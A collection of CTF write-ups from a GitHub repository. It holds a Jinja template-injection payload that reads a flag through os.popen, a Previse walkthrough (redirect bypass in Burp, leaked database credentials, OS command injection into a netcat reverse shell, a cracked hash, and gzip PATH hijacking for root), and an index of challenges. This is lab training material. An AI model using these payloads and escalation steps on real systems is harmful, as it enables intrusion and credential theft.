{'asdf': b'app.py\nflag_P54ed\nschema.sql\nstatic\ntemplates\n'}
```
As you can see above, the name of the flag is clear so the next request is as follows:
```python
{%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=asdf&os=os&command=cat flag_P54ed
```
If we decode the session cookie twice, the flag is visible
```
flask-unsign --decode --cookie [COOKIE]
{'asdf': b'HTB{b4by_ninj4s_****_***_******_**_******}\n'}
```


### File: CTF-writeups/HackTheBox/machines/Previse/README.md

# Previse

The first thing we're going to do is run the Nmap scan 
```
nmap -sC -sV [IP]
```
<p align="center">
<img src="./images/01.jpg">
</p>

As a result of this Nmap scan, I discovered a port `22 SSH` and 80

<p align="center">
<img src="./images/02.jpg">
</p>

Next, I used `gobuster` to brute force the directory.

```bash
gobuster dir -u http://10.10.11.104 -w ./directory-list-2.3-medium.txt -x php
```

A list of routes can be found in the image below:

<p align="center">
<img src="./images/03.jpg">
</p>

Furthermore, I have discovered an interesting directory which is `nav.php`, while analyzing this report.

Therefore, I found that it is possible to `create an account` in this directory.

<p align="center">
<img src="./images/04.jpg">
</p>

This website allows the creation of accounts but this page has been redirected to `login.php`

So I created an account using tricks, and I'll explain to you how I did it.

To begin, I have opened the `burpsuite` tool to capture the request.

I have captured the request

next right-click the mouse you get the `do intercept` option and click the response to this request

<p align="center">
<img src="./images/05.jpg">
</p>

And the send `request to response`

You now get a response in the burpsuit and change the status code from `302` to `200 Ok`. 

This trick will change `302` to `200` in the request and send the response to the browser 

<p align="center">
<img src="./images/06.jpg">
</p>

Now you can see that we can `create an account` on the website.

Create a username and password according to your wishes.

<p align="center">
<img src="./images/07.jpg">
</p>

Next, we going to login into the website using a `username` and `password`

<p align="center">
<img src="./images/02.jpg">
</p>

> Now we are successfully login into the site 

Next, we clicked on the `file menu`, where we found `sitebackup.zip`, which is interesting.

<p align="center">
<img src="./images/08.jpg">
</p>

So download the file and extract it.

We got some interesting `PHP` files.

Further analyzing this I got two interesting files which are `config.php` and logs.php.

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
We get the username and password for the MySQL database in `config.php`.

Next to another file is `logs.php` in this file I got the one vulnerability which is `os command injection`.

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    
```

The file contains a delimiter and has not been sanitized properly, which allows us to execute `os command injections`.

So first go to that website and click the `management menu` and there is a `file log`.

Enter to file log you can able to see the delimiter. so capture this request in a burpsuit.

<p align="center">
<img src="./images/09.jpg">
</p>

Before that start the netcat
```
nc -nlvp 1234
```
So injected the downloaded payload in the delimiter which is shown in the image.

<p align="center">
<img src="./images/10.jpg">
</p>

Now you get the shell in the `netcat`.

upgrade shell : 
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
or
```
echo os.system('/bin/bash')
```
Next, we going to search username and password in the `MySQL` database 

We got one interesting file in the site backup folder which is `config.php`

In this file, there is a username and password, and a database also.
```
mysql -u root -D previse -p
```
Now it will ask the password so enter the password `mySQL_p@ssw0rd!:)`

Now you can able to enter it into in MySQL database.
<p align="center">
<img src="./images/11.jpg">
</p>
Yes the hash password of the user we just found. I decoded the hash code. I’ll post it here as an exception for friends with weak machines. 

`$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.` = `ilovecody112235!` 

Now that we have found our user information, let’s connect with the ssh port.
```
ssh m4lwhere@10.10.11.104
```
<p align="center">
<img src="./images/12.jpg">
</p>

## Privilege Escalation

Now, let’s see what command this user can run using `sudo`
> sudo -l

<p align="center">
<img src="./images/13.jpg">
</p>

On catting the file presented I got below result.
```shell
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
Further analyzing the file I have found a vulnerability which is path injection
So now enter into the tmp folder.

Transfer the payload and the payload should be in the name of `gzip`.

before that set the listener in our local machine

> ncat -lvnp 4321

Next, go to the machine and enter the below command

First, enter the payload shown in the below image

<p align="center">
<img src="./images/14.jpg">
</p>

```shell
export PATH=/tmp:$PATH
```
OR 

```shell
export PATH=$(pwd):$PATH
```

Then enter the following command
> sudo /opt/scripts/access_backup.sh

And here we got root shell.

<p align="center">
<img src="./images/15.jpg">
</p>


### File: CTF-writeups/README.md

# CTF Write-ups
<p align="center">
<img src="./resources/images/logo.png">
<br>
<i>Writeups Challenges I have solved</i>
</p>

You can see all the writeups here : <a href="https://hsnhk.gitbook.io/ctf-writeups/">gitbook</a>

* [CTF-writeups](https://github.com/HSNHK/CTF-writeups)
    * [Hack The Box](#hack-the-box)
    * [CTF learn](#ctf-learn)
    * [Try Hack Me](#tryhackme)

# Hack The Box
| Name  | Type | Descriptions | Writeup | 
| ----- | ---- | ------------ | ------- |
| Previse | Machine | <img src="./resources/images/Previse_Machine_Banner.JPG" height="110px" style="border-radius: 30px; padding-top: 10px"> | [Writeup](HackTheBox/machines/Previse) |
| Toxic | Web | Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸 | [Writeup](HackTheBox/challenges/web/Toxic) | 
| Emdee five for life | Web | Can you encrypt fast enough? | [Writeup](HackTheBox/challenges/web/Emdee-five-for-life) |
| FreeLancer | Web | Can you test how secure my website is? Prove me wrong and capture the flag! | [Writeup](HackTheBox/challenges/web/FreeLancer) |
| Templated | Web | Can you exploit this simple mistake? | [Writeup](HackTheBox/challenges/web/Templated) |
| Impossible Password | Reversing | Are you able to cheat me and get the flag? | [Writeup](HackTheBox/challenges/reversing/Impossible-Password) |
| Illumination | Forensics | A Junior Developer just switched to a new source control platform. Can you find the secret token? | [Writeup](HackTheBox/challenges/forensics/Illumination) |
| Phonebook | Web | Who is lucky enough to be included in the phonebook? | [Writeup](HackTheBox/challenges/web/Phonebook) |
| baby ninja jinja | Web | The elders of the village summoned you to take the reigns after the recent death of you father. It's time to end the emperor's gruesome tyranny. | [Writeup](HackTheBox/challenges/web/baby-ninja-jinja) |
| Gunship | Web | A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world... all the wooing in the world to make you feel more lonely... this ride ends here, with a tribute page of the British synthwave band called Gunship. 🎶 | [Writeup](HackTheBox/challenges/web/Gunship) |

# CTF learn
| Name  | Type | Descriptions | Writeup | 
| ----- | ---- | ------------ | ------- |
| Inj3ction Time | Web | I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command | [Writeup](CTFlearn/web/Inj3ction-Time) |
| Calculat3 M3  | Web | Here! http://web.ctflearn.com/web7/ I forget how we were doing those calculations, but something tells me it was pretty insecure. | [Writeup](CTFlearn/web/Calculat3-M3) |

# Tryhackme
| Name  | Type | Descriptions | Writeup | 
| ----- | ---- | ------------ | ------- |
| Basic Malware RE | Room | This room aims towards helping everyone learn about the basics of “Malware Reverse Engineering”. | [Writeup](https://hsnhk.medium.com/tryhackme-basic-malware-re-bfcd518fd314) |
| Reversing ELF | Room | Room for beginner Reverse Engineering CTF players. | [Writeup](https://hsnhk.medium.com/tryhackme-reversing-elf-60ab96969e41) |
| Reverse Engineering | Room | This room focuses on teaching the basics of assembly through reverse engineering. | [Writeup](https://hsnhk.medium.com/tryhackme-reverse-engineering-9cd408849f13) |
| Blue | Machine | Deploy & hack into a Windows machine, leveraging common misconfigurations issues. | [Writeup](https://hsnhk.medium.com/tryhackme-blue-1ccfae7c2e8a) |
| OWASP Top 10 | Room | Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10 most critical web security risks. | [Writeup](https://hsnhk.medium.com/tryhackme-owasp-top-10-e2b342c4f9f8) |
| Nmap Room | Room |  An in depth look at scanning with Nmap, a powerful network scanning tool. | [Writeup](https://hsnhk.medium.com/tryhackme-nmap-room-9db134d5c8cc) |
| The find command | Room | A learn-by-doing approach to the find command. | [Writeup](https://hsnhk.medium.com/tryhackme-the-find-command-d64026d89c3) |
| Disk Analysis & Autopsy | Forensic | Ready for a challenge? Use Autopsy to investigate artifacts from a disk image. | [Writeup](https://hsnhk.medium.com/tryhackme-disk-analysis-autopsy-f967c64feaf1) |

